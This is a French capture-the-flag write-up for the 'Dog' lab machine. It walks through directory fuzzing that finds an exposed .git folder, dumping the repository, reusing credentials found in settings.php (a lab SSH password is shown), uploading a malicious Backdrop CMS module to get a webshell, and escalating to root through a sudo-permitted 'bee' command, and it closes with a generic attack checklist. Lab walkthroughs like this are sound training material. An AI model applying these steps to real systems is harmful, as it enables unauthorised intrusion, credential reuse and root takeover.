@@ -1,0 +1,183 @@
+---
+title: Dog
+date: '2025-06-28'
+tags: ['cms', 'sudo exploit', 'git directory leakage', 'RCE']
+draft: false
+summary: 'Ce défi exploite des failles dans un CMS exposé (Backdrop CMS) et une escalade de privilèges via un binaire mal configuré (sudo bee).'
+---
+
+# 🧠 Types de vulnérabilités exploitées
+
+1. .git directory leakage : exposition publique du répertoire .git accessible via HTTP.
+2. Informations sensibles exposées dans un fichier de configuration (settings.php).
+3. RCE (Remote Code Execution) dans Backdrop CMS via upload de module malveillant.
+4. Escalade de privilèges via un binaire sudo mal configuré.
+
+# 🧭 Méthodologie étape par étape
+
+## 🔍 1. Scan initial & reconnaissance
+
+• Scan des ports → ports 22 (SSH) et 80 (HTTP) sont ouverts.
+![nmap](/static/images/dog/nmap.png)
+
+## 🗂 2. Recherche de chemins sensibles
+
+◇ Fuzz avec dirsearch → **/ .git/ accessible**
+
+```
+$ dirsearch -u http://10.10.11.58 -x 404,500
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
+Wordlist size: 11460
+
+Output File: /home/nnbb/reports/http_10.10.11.58/_25-06-28_20-21-21.txt
+
+Target: http://10.10.11.58/
+
+[20:21:21] Starting:
+[20:21:38] 301 -  309B  - /.git  ->  http://10.10.11.58/.git/
+[20:21:38] 200 -  409B  - /.git/branches/
+[20:21:38] 200 -   73B  - /.git/description
+[20:21:38] 200 -   95B  - /.git/COMMIT_EDITMSG
+[20:21:38] 200 -  604B  - /.git/
+[20:21:38] 200 -   23B  - /.git/HEAD
+[20:21:38] 200 -   92B  - /.git/config
+[20:21:38] 200 -  455B  - /.git/info/
+[20:21:38] 200 -  240B  - /.git/info/exclude
+[20:21:39] 200 -  476B  - /.git/logs/
+[20:21:39] 200 -  650B  - /.git/hooks/
+[20:21:39] 301 -  319B  - /.git/logs/refs  ->  http://10.10.11.58/.git/logs/refs/
+[20:21:39] 200 -  230B  - /.git/logs/HEAD
+[20:21:39] 301 -  320B  - /.git/refs/heads  ->  http://10.10.11.58/.git/refs/heads/
+[20:21:39] 301 -  319B  - /.git/refs/tags  ->  http://10.10.11.58/.git/refs/tags/
+[20:21:39] 301 -  325B  - /.git/logs/refs/heads  ->  http://10.10.11.58/.git/logs/refs/heads/
+[20:21:39] 200 -   41B  - /.git/refs/heads/master
+[20:21:39] 200 -  230B  - /.git/logs/refs/heads/master
+[20:21:39] 200 -  461B  - /.git/refs/
+[20:21:43] 200 -  337KB - /.git/index
+[20:21:43] 200 -    2KB - /.git/objects/
+[20:21:44] 403 -  276B  - /.htaccess.bak1
+[20:21:44] 403 -  276B  - /.ht_wsr.txt
+[20:21:45] 403 -  276B  - /.htaccess.orig
+[20:21:45] 403 -  276B  - /.htaccess.save
+[20:21:45] 403 -  276B  - /.htaccess.sample
+[20:21:45] 403 -  276B  - /.htaccess_extra
+[20:21:45] 403 -  276B  - /.htaccessOLD
+[20:21:45] 403 -  276B  - /.htaccess_orig
+[20:21:45] 403 -  276B  - /.htaccessBAK
+[20:21:45] 403 -  276B  - /.htaccess_sc
+[20:21:45] 403 -  276B  - /.htaccessOLD2
+[20:21:45] 403 -  276B  - /.htm
+[20:21:45] 403 -  276B  - /.httr-oauth
+[20:21:45] 403 -  276B  - /.htpasswd_test
+[20:21:45] 403 -  276B  - /.html
+[20:21:45] 403 -  276B  - /.htpasswds
+[20:21:51] 403 -  276B  - /.php
+[20:23:00] 301 -  309B  - /core  ->  http://10.10.11.58/core/
+[20:23:16] 301 -  310B  - /files  ->  http://10.10.11.58/files/
+[20:23:16] 200 -  586B  - /files/
+[20:23:37] 200 -  456B  - /layouts/
+[20:23:39] 200 -    7KB - /LICENSE.txt
+[20:23:51] 301 -  312B  - /modules  ->  http://10.10.11.58/modules/
+[20:23:52] 200 -  399B  - /modules/
+[20:24:17] 200 -    5KB - /README.md
+[20:24:20] 200 -  528B  - /robots.txt
+[20:24:22] 403 -  276B  - /server-status
+[20:24:22] 403 -  276B  - /server-status/
+[20:24:23] 200 -    0B  - /settings.php
+[20:24:29] 301 -  310B  - /sites  ->  http://10.10.11.58/sites/
+[20:24:40] 301 -  311B  - /themes  ->  http://10.10.11.58/themes/
+[20:24:40] 200 -  454B  - /themes/
+```
+
+## 🧑‍💻 3. Exfiltration du dépôt Git
+
+◇ Utilisation de GitHack pour extraire le contenu
+
+```
+python3 ../GitHack/GitHack.py http://10.10.11.58/.git/
+```
+
+cd 10.10.11.58/
+
+◇ Explore settings.php pour trouver les identifiants de la base de données (et potentiellement un mot de passe réutilisé).
+
+## 🔐 4. Tentative de connexion CMS
+
+◇ Tente de se connecter avec support@dog.htb, sans succès.
+
+◇ Recherche dans le code exfiltré un autre mail (tiffany@dog.htb) → connexion réussie avec BackDropJ20....
+
+## 💥 5. Exploitation RCE
+
+◇ Télécharge un exploit Backdrop CMS (Exploit-DB #52021).
+
+◇ Le script Python (python3 exploit.py http://10.10.11.58) génère un fichier shell.zip, non accepté par Backdrop.
+
+◇ Solution : recréer un .tar propre à partir du dossier généré.
+
+```
+tar -cf shell.tar shell/
+```
+
+◇ Upload sur /admin/modules/install.
+
+◇ Accès à ta webshell via :
+
+```
+http://10.10.11.58/modules/shell/shell.php?cmd=whoami
+```
+
+## 🔑 6. Accès utilisateur via SSH
+
+◇ Dans settings.php, identifiants MySQL sont utilisés aussi par un utilisateur système.
+
+◇ Teste l’accès SSH avec johncusack:BackDropJ2024DS2024.
+
+```
+ssh johncusack@10.10.11.5
+```
+
+◇ ✅ Récupération de user.txt.
+
+## 🚀 7. Escalade de privilèges
+
+◇ Vérifie les droits sudo :
+
+```
+sudo -l
+```
+
+◇ Résultat : peut exécuter /usr/local/bin/bee en tant que root.
+
+◇ bee permet d’exécuter du code PHP → donc exécuter des commandes système.
+
+```
+sudo /usr/local/bin/bee ev "system('id')"
+sudo /usr/local/bin/bee ev "system('cat /root/root.txt')"
+```
+
+◇ ✅ Récupération du flag root.txt
+
+# ✅ Checklist réutilisable pour d'autres labs similaires
+
+1. 🔎 Scanner les ports et identifier technologies web
+
+2. 🗂 Fuzzer à la recherche de .git, .env, admin/, etc.
+
+3. 📦 Extraire les dépôts .git avec GitHack ou GitTools
+
+4. 🔐 Trouver des identifiants ou mots de passe dans les fichiers de config
+
+5. 👤 Tenter une connexion CMS ou SSH avec ces infos
+
+6. 🧠 Identifier la version du CMS et rechercher un exploit adapté
+
+7. 📤 Envoyer un payload (webshell, reverse shell) via un module ou formulaire vulnérable
+
+8. 🧑‍💻 Escalader les privilèges via sudo, SUID ou cron jobs mal configurés
